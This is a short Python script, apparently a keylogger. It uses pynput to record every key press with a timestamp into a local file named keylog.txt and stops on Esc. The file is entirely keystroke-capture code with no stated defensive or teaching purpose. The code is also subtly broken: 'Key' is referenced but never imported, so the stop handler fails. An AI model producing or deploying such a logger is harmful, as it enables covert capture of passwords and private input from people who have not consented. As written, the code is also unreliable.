from pynput.keyboard import Listener
import logging

# Set up the logging configuration
log_file = "keylog.txt"  # File to store logged keystrokes

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Define the function that handles each key press event
def on_press(key):
    try:
        # Log the pressed key
        logging.info(f"{key.char}")
    except AttributeError:
        # If it's a special key (e.g. shift, ctrl), log the key name
        logging.info(f"{key}")

# Define the function that handles the listener stopping
def on_release(key):
    if key == Key.esc:  # Stop the listener when the 'Esc' key is pressed
        return False

# Start the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

